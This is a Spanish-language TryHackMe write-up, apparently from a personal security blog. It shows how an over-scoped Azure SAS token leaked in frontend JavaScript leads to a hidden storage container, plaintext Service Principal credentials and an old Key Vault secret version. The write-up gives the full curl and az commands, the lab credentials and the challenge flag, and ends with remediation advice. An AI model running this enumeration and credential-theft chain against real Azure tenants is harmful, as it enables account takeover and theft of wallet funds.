@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Byte Lotus – Day 9 — ffSecurityNull — Security Writeups</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<div class="wrap">
+  <div class="case-file">
+
+    <a class="back" href="../index.html">&larr; volver al log</a>
+
+    <div class="stamp-block">
+      <div class="cell">
+        <div class="k">Plataforma</div>
+        <div class="v">TryHackMe</div>
+      </div>
+      <div class="cell">
+        <div class="k">Categoría</div>
+        <div class="v">Cloud Security / Azure Storage &amp; Key Vault</div>
+      </div>
+      <div class="cell">
+        <div class="k">Severidad</div>
+        <div class="v">High</div>
+      </div>
+      <div class="cell">
+        <div class="k">Fecha</div>
+        <div class="v">2026-08-07</div>
+      </div>
+    </div>
+
+    <h1>CryptoCabana — SAS token filtrado, container oculto y credenciales de Service Principal en texto plano</h1>
+    <p class="dek">Se explotó un SAS token con permisos excesivos filtrado en el frontend de un kiosko de backups, lo que permitió descubrir un container oculto en la cuenta de Storage y extraer credenciales de un Service Principal en texto plano. Con esas credenciales se accedió a un Azure Key Vault y, aprovechando que una versión anterior de un secreto rotado seguía siendo legible, se reconstruyó una seed phrase de wallet completa.</p>
+
+    <h2>Reconocimiento</h2>
+    <p>El objetivo era "CryptoCabana", un kiosko web del resort que ofrecía a los huéspedes hacer backup de sus seed phrases de wallet cripto, con la promesa de landing page <em>"Backed up. Sleep easy."</em> Según el briefing, un huésped había hecho ese backup semanas atrás y esa misma mañana su wallet fue vaciada por una transacción que él nunca firmó — alguien más tuvo acceso a lo que se suponía debía quedar resguardado. El objetivo del ejercicio era averiguar en qué confiaba el kiosko para acceder al storage por su cuenta, y hasta dónde llegaba esa confianza.</p>
+
+
+    <p>El primer paso técnico fue obtener acceso al entorno de laboratorio de TryHackMe (Azure CLI vía Cloud Shell o instalado localmente), usando las credenciales temporales del panel de Cloud Details:</p>
+
+    <figure>
+      <img src="../assets/img/Day9-cloud-details.png" alt="Panel de Cloud Details de TryHackMe mostrando username y Temporary Access Pass del lab">
+      <figcaption>Fig. 3 — Panel de Cloud Details de TryHackMe con credenciales del lab (username y Temporary Access Pass).</figcaption>
+    </figure>
+
+    <pre><code>az --version
+azure-cli  2.88.0</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day9-az-version.png" alt="Verificación de instalación de Azure CLI en Kali Linux">
+      <figcaption>Fig. 4 — Verificación de instalación de Azure CLI (az --version) en Kali Linux.</figcaption>
+    </figure>
+
+    <p>Tras una regeneración de instancia, se refrescaron las credenciales desde el mismo panel:</p>
+
+    <figure>
+      <img src="../assets/img/Day9-creds-refresh.png" alt="Credenciales actualizadas del lab con Lab ID y username tras regenerarse la instancia">
+      <figcaption>Fig. 5 — Credenciales actualizadas del lab (Lab ID, username) tras regenerarse la instancia.</figcaption>
+    </figure>
+
+    <p>Con esas credenciales se inició sesión en Azure, confirmando la suscripción <code>Az-Subs-CTF</code> y el tenant <code>THM CTF</code>:</p>
+
+    <pre><code>az login --username usr-08068952@thmctf.onmicrosoft.com --allow-no-subscriptions</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day9-az-login.png" alt="Login exitoso vía az login mostrando la suscripción Az-Subs-CTF y el tenant THM CTF">
+      <figcaption>Fig. 6 — Login exitoso vía az login mostrando la suscripción Az-Subs-CTF y el tenant THM CTF.</figcaption>
+    </figure>
+
+    <h2>Vulnerabilidad identificada</h2>
+    <p>Siguiendo la primera pista del itinerario — inspeccionar qué entregaba el kiosko "gratis" antes de interactuar con él — se analizó el código fuente de la página estática (<code>cryptocabanaf5scjagc.z13.web.core.windows.net</code>) alojada en Azure Storage Static Website. Ahí se encontró un <strong>SAS (Shared Access Signature) token</strong> embebido en el JavaScript del frontend, usado por el kiosko para leer directamente desde un container de Storage llamado <code>backups</code>.</p>
+    <p>Se identifican varias fallas encadenadas:</p>
+    <ul>
+      <li><strong>SAS token expuesto en el frontend:</strong> el token viajaba en el código fuente del sitio, visible para cualquier visitante que inspeccionara la página, en lugar de estar detrás de un backend que validara la identidad del usuario.</li>
+      <li><strong>Alcance del SAS demasiado amplio:</strong> el token no estaba limitado al container <code>backups</code> — permitía además enumerar la cuenta de Storage completa (<code>comp=list</code> a nivel de cuenta), revelando la existencia de un container adicional no referenciado en ningún lugar del sitio.</li>
+      <li><strong>Container oculto (<code>vault</code>) con datos sensibles:</strong> ese container contenía un archivo de credenciales de un Service Principal de Azure en texto plano y una seed phrase de wallet.</li>
+      <li><strong>Secretos de Key Vault con versiones anteriores accesibles:</strong> aun tras rotar un secreto, su versión previa seguía siendo legible con los permisos ya obtenidos, exponiendo el valor "viejo" que se suponía reemplazado.</li>
+    </ul>
+
+    <div class="callout"><strong>Nota:</strong> Ninguna de estas fallas por separado es inusual — SAS tokens de solo lectura y Service Principals con acceso acotado son prácticas comunes en Azure. El problema es la combinación: un token de frontend con alcance de cuenta completa, un container "oculto" solo por no estar enlazado, y secretos rotados cuyas versiones anteriores nunca se purgan ni se restringen.</div>
+
+    <h2>Explotación (PoC)</h2>
+
+    <p><strong>Paso 1 — Intento de listado del container conocido (<code>backups</code>).</strong> Con el SAS token extraído del JavaScript del kiosko, se intentó listar el contenido del container que el sitio sí referenciaba:</p>
+    <pre><code>curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/backups?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..." | xmllint --format -
+
+&lt;EnumerationResults ServiceEndpoint="https://cryptocabanaf5scjagc.blob.core.windows.net/" ContainerName="backups"&gt;
+  &lt;Blobs/&gt;
+  &lt;NextMarker/&gt;
+&lt;/EnumerationResults&gt;</code></pre>
+    <p>El resultado fue un container vacío — ningún blob dentro de <code>backups</code>. Esto sugería que el nombre visible desde el frontend no era el destino real de los datos sensibles.</p>
+
+    <figure>
+      <img src="../assets/img/Day9-list-backups-empty.png" alt="Listado del container backups vía SAS token con resultado vacío">
+      <figcaption>Fig. 7 — Listado del container 'backups' vía SAS token (resultado vacío).</figcaption>
+    </figure>
+
+    <p><strong>Paso 2 — Enumeración a nivel de cuenta de Storage.</strong> Dado que el SAS token tenía <code>srt=sco</code> (service, container, object), su alcance no estaba limitado a un único container. Se repitió la petición apuntando a la raíz de la cuenta en lugar del container específico:</p>
+    <pre><code>curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..." | xmllint --format -
+
+&lt;EnumerationResults ServiceEndpoint="https://cryptocabanaf5scjagc.blob.core.windows.net/"&gt;
+  &lt;Containers&gt;
+    &lt;Container&gt;
+      &lt;Name&gt;$web&lt;/Name&gt;
+      ...
+    &lt;/Container&gt;
+    &lt;Container&gt;
+      &lt;Name&gt;backups&lt;/Name&gt;
+      ...
+    &lt;/Container&gt;
+    &lt;Container&gt;
+      &lt;Name&gt;vault&lt;/Name&gt;
+      ...
+    &lt;/Container&gt;
+  &lt;/Containers&gt;
+&lt;/EnumerationResults&gt;</code></pre>
+    <p>Esta enumeración reveló un tercer container, <code>vault</code>, que no estaba referenciado en ningún lugar del sitio ni del JavaScript del kiosko.</p>
+
+    <figure>
+      <img src="../assets/img/Day9-list-account-vault.png" alt="Listado a nivel de cuenta de Storage revelando el container oculto vault">
+      <figcaption>Fig. 8 — Listado a nivel de cuenta de Storage revelando el container oculto 'vault'.</figcaption>
+    </figure>
+
+    <p><strong>Paso 3 — Descarga de los blobs dentro de <code>vault</code>.</strong> Con el mismo SAS token (válido a nivel de cuenta) se descargaron y leyeron los dos archivos encontrados:</p>
+    <pre><code>curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..." -o backup-service-account.json
+
+curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/seed_phrase.txt?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..." -o seed_phrase.txt
+
+cat backup-service-account.json
+{"client_id":"dbcf2923-e4eb-4b72-a0a4-688aa1185cf5","client_secret":"UBX8Q-xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg","key_vault_name":"ccabana-kv-f5scjagc","key_vault_uri":"https://ccabana-kv-f5scjagc.vault.azure.net/","note":"CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT","tenant_id":"8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"}
+
+cat seed_phrase.txt
+velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp</code></pre>
+    <p>El archivo <code>backup-service-account.json</code> contenía credenciales completas de un Service Principal (<code>client_id</code>, <code>client_secret</code>, <code>tenant_id</code>) en texto plano, junto con el nombre del Key Vault asociado. El archivo <code>seed_phrase.txt</code> exponía directamente una seed phrase de wallet en texto plano — la nota interna, irónicamente, advertía "rotar esto si alguna vez sale del vault", sin anticipar que el propio vault sería alcanzable por el SAS del frontend.</p>
+
+    <figure>
+      <img src="../assets/img/Day9-vault-files-dump.png" alt="Descarga y lectura de backup-service-account.json y seed_phrase.txt desde el container vault">
+      <figcaption>Fig. 9 — Descarga y lectura de backup-service-account.json y seed_phrase.txt desde el container vault.</figcaption>
+    </figure>
+
+    <p><strong>Paso 4 — Login como Service Principal y enumeración del Key Vault.</strong> Con las credenciales filtradas se inició sesión en Azure como el propio Service Principal de automatización de backups:</p>
+    <pre><code>az login --service-principal \
+  --username dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
+  --password 'UBX8Q-xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg' \
+  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c</code></pre>
+    <p>El login fue exitoso, confirmando el tipo de identidad como <code>servicePrincipal</code>. A continuación se listaron los secrets disponibles en el Key Vault referenciado en el JSON filtrado:</p>
+    <pre><code>az keyvault secret list --vault-name ccabana-kv-f5scjagc --output table
+
+Name          Id
+------------  --------------------------------------------------------
+key-shard-1   https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-1
+key-shard-2   https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2
+key-shard-3   https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-3
+master-key    https://ccabana-kv-f5scjagc.vault.azure.net/secrets/master-key</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day9-sp-login-keyvault-list.png" alt="Login como Service Principal y listado de secrets en Key Vault mostrando key-shard-1, 2, 3 y master-key">
+      <figcaption>Fig. 10 — Login como Service Principal y listado de secrets en Key Vault (key-shard-1/2/3, master-key).</figcaption>
+    </figure>
+
+    <p><strong>Paso 5 — Lectura de secrets: acceso parcial.</strong> Se intentó leer el valor de cada secret. <code>key-shard-1</code> y <code>key-shard-3</code> se obtuvieron sin problema, pero <code>master-key</code> devolvió <code>403 Forbidden</code> por política RBAC — el Service Principal no tenía permiso de lectura sobre ese secret específico.</p>
+    <pre><code>Code: Forbidden
+Message: Caller is not authorized to perform action on resource.
+...
+Resource: '.../vaults/ccabana-kv-f5scjagc/secrets/master-key'
+Vault: ccabana-kv-f5scjagc;location=eastus</code></pre>
+    <p>Sin embargo, el permiso de <em>listar versiones</em> de otros secrets sí estaba disponible. Aplicando la pista narrativa de @0xMia sobre revisar qué aspecto tenían los valores antes de su rotación, se listaron las versiones históricas de <code>key-shard-2</code>:</p>
+    <pre><code>az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 --output table
+
+Name
+------------
+key-shard-2
+key-shard-2</code></pre>
+    <p>Existían dos versiones del mismo secret — la actual y una anterior, previa a la rotación.</p>
+
+    <figure>
+      <img src="../assets/img/Day9-rbac-forbidden.png" alt="Intento de lectura de secrets: key-shard-1 y key-shard-3 obtenidos, master-key da 403 Forbidden por RBAC">
+      <figcaption>Fig. 11 — Intento de lectura de secrets: key-shard-1 y key-shard-3 obtenidos, master-key da 403 Forbidden (RBAC).</figcaption>
+    </figure>
+
+    <p>El comando de login como Service Principal se muestra completo a continuación, usando el <code>client_id</code>, <code>client_secret</code> y <code>tenant_id</code> extraídos del JSON filtrado:</p>
+
+    <figure>
+      <img src="../assets/img/Day9-sp-login-full.png" alt="Comando completo az login --service-principal con login exitoso mostrando la suscripción Az-Subs-CTF">
+      <figcaption>Fig. 12 — Comando completo az login --service-principal usando el client_id/secret/tenant del JSON filtrado, con login exitoso.</figcaption>
+    </figure>
+
+    <p><strong>Paso 6 — Lectura de la versión anterior (pre-rotación) de <code>key-shard-2</code>.</strong> Con el ID de la versión antigua obtenido del listado, se leyó directamente ese valor histórico:</p>
+    <pre><code>az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 \
+  --version 3d6492d2c6f74123bc754a9ded22b2a0 --query value -o tsv
+
+_k3ys_n0t_</code></pre>
+    <p>La versión anterior del secreto, técnicamente "reemplazada" por la rotación, seguía siendo completamente legible y contenía el fragmento real de la clave: <code>_k3ys_n0t_</code>.</p>
+
+    <figure>
+      <img src="../assets/img/Day9-old-version-secret.png" alt="Versión anterior pre-rotación de key-shard-2 listada y leída con --version, revelando el fragmento real _k3ys_n0t_">
+      <figcaption>Fig. 13 — Versión anterior (pre-rotación) de key-shard-2 listada y leída con --version, revelando el fragmento real _k3ys_n0t_.</figcaption>
+    </figure>
+
+    <p>Combinando los fragmentos obtenidos de <code>key-shard-1</code>, <code>key-shard-3</code> y la versión histórica de <code>key-shard-2</code> se reconstruyó la flag del reto:</p>
+    <pre><code>THM{n0t_ur_k3ys_n0t_ur_c01ns!}</code></pre>
+
+    <h2>Post-explotación / impacto</h2>
+    <p>La cadena completa permitió:</p>
+    <ul>
+      <li><strong>Descubrimiento de infraestructura oculta:</strong> un container de Storage (<code>vault</code>) nunca referenciado públicamente, alcanzado solo por el alcance excesivo del SAS token del frontend.</li>
+      <li><strong>Exfiltración de una seed phrase de wallet en texto plano</strong>, exactamente el dato que el kiosko prometía mantener seguro.</li>
+      <li><strong>Compromiso de una identidad de servicio (Service Principal)</strong> con credenciales completas en texto plano, permitiendo autenticarse como ese principal contra todo el tenant de Azure.</li>
+      <li><strong>Acceso de lectura a la mayoría de los secrets de un Key Vault de producción</strong>, incluyendo shards de una clave crítica.</li>
+      <li><strong>Bypass parcial de la rotación de secretos:</strong> aunque <code>master-key</code> estaba correctamente protegido por RBAC, el fragmento equivalente en <code>key-shard-2</code> quedó expuesto igual a través de su versión anterior, no purgada tras la rotación.</li>
+    </ul>
+    <p>El impacto en un entorno real sería crítico para el usuario final: la exposición de una seed phrase equivale a pérdida total de fondos en la wallet asociada, tal como describe el briefing del reto. A nivel de infraestructura, la identidad de Service Principal comprometida podría usarse como punto de apoyo para explorar otros recursos del tenant a los que tuviera acceso.</p>
+
+    <h2>Remediación</h2>
+    <ul>
+      <li><strong>Nunca embeber SAS tokens en código de frontend:</strong> las operaciones sobre Storage deben pasar por un backend que autentique al usuario y genere tokens de vida corta y alcance mínimo bajo demanda, nunca hardcodeados en JavaScript servido públicamente.</li>
+      <li><strong>Restringir el alcance (<code>srt</code>) de los SAS tokens:</strong> limitar el token al recurso específico que necesita (objeto o container puntual), nunca a nivel de servicio/cuenta completa, para que la enumeración de otros containers no sea posible aunque el token se filtre.</li>
+      <li><strong>No depender de "seguridad por oscuridad" en nombres de containers:</strong> un container no listado en el sitio no es un container protegido. El control de acceso debe ser explícito (permisos, RBAC), no basado en que el nombre no se conozca.</li>
+      <li><strong>Nunca almacenar credenciales de Service Principal en texto plano</strong> en Storage, código fuente o archivos de configuración accesibles. Usar Managed Identities de Azure cuando sea posible, eliminando la necesidad de gestionar secretos de autenticación manualmente.</li>
+      <li><strong>Purgar o restringir versiones anteriores de secrets tras la rotación:</strong> configurar políticas de Key Vault que deshabiliten o eliminen versiones antiguas una vez rotado un secreto, en lugar de dejarlas indefinidamente accesibles con el mismo permiso de lectura.</li>
+      <li><strong>Aplicar RBAC granular y consistente:</strong> la protección específica sobre <code>master-key</code> fue correcta, pero de nada sirve si un secreto funcionalmente equivalente (<code>key-shard-2</code>) queda expuesto por otra vía. La política de acceso debe cubrir el dato, no solo el nombre del secret actual.</li>
+    </ul>
+
+    <h2>Lecciones aprendidas</h2>
+    <p>Este reto ilustra un patrón recurrente en entornos cloud: controles de acceso que son técnicamente correctos en su capa más visible (RBAC bloqueando <code>master-key</code>) pero que se vuelven irrelevantes si existe una ruta alternativa hacia el mismo dato — en este caso, una versión anterior del secreto equivalente que nunca fue purgada.</p>
+    <p>También refuerza que el alcance de un SAS token importa tanto como su exposición. Un token filtrado con permisos de solo lectura sobre un único blob es un incidente menor; el mismo token con <code>srt=sco</code> (acceso a nivel de servicio) convierte una filtración puntual en una puerta hacia toda la cuenta de Storage, incluyendo recursos que nadie pensó en ocultar activamente porque "no estaban enlazados en ningún lado".</p>
+    <p>Por último, la pista narrativa del reto — desconfiar de valores "recién rotados" y preguntarse cómo se veían minutos antes — es un buen recordatorio de metodología: en Key Vault, <code>list-versions</code> y <code>show --version</code> son comandos de reconocimiento tan valiosos como cualquier scanner, y una rotación de secretos sin política de expiración de versiones antiguas no es una rotación real.</p>
+
+  </div>
+
+  <footer>
+    <span>© 2026 ffSecurityNull — La Rioja, Argentina</span>
+    <a href="../index.html">Volver al índice</a>
+  </footer>
+</div>
+
+</body>
+</html>
